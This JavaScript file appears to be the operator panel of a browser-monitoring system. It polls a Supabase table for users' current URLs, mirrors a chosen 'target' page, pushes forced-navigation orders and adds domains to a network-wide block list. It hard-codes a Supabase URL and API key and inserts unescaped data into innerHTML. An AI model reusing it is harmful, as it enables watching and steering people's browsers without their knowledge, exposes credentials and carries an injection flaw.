const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

let currentTarget = null;

async function refresh() {
    const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&order=timestamp.desc&limit=40`, {headers: {'apikey': SB_KEY}});
    const logs = await res.json();
    
    const users = [...new Set(logs.map(l => l.usuario_id))];
    const list = document.getElementById('user-list');
    
    list.innerHTML = users.map(u => {
        const lastLog = logs.find(x => x.usuario_id === u);
        return `
            <div class="user-card ${currentTarget === u ? 'active' : ''}" onclick="setTarget('${u}')">
                <i class="fas fa-user"></i> <b>${u}</b><br>
                <small style="opacity:0.6">${lastLog.url_actual.substring(0, 35)}...</small>
            </div>
        `;
    }).join('');

    if (currentTarget) {
        const last = logs.find(x => x.usuario_id === currentTarget);
        const mirror = document.getElementById('live-screen');
        if (last && mirror.src !== last.url_actual) {
            mirror.src = last.url_actual;
        }
    }
}

function setTarget(id) {
    currentTarget = id;
    document.getElementById('id-selected').innerText = id;
    document.getElementById('target-title').innerText = "VIGILANDO: " + id;
}

async function exec(type) {
    if (!currentTarget) return alert("Selecciona un usuario primero");
    const val = document.getElementById('force-url').value;
    
    await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${currentTarget}`, {method: 'DELETE', headers: {'apikey': SB_KEY}});
    
    await fetch(`${SB_URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: {'apikey': SB_KEY, 'Content-Type': 'application/json'},
        body: JSON.stringify({ usuario_id: currentTarget, orden: type, contenido: val, activa: true })
    });
    alert("Orden enviada");
}

async function addBlacklist() {
    const url = document.getElementById('block-url').value;
    await fetch(`${SB_URL}/rest/v1/links_bloqueados`, {
        method: 'POST',
        headers: {'apikey': SB_KEY, 'Content-Type': 'application/json'},
        body: JSON.stringify({ url: url })
    });
    alert("Dominio bloqueado en toda la red.");
}

setInterval(refresh, 3000);
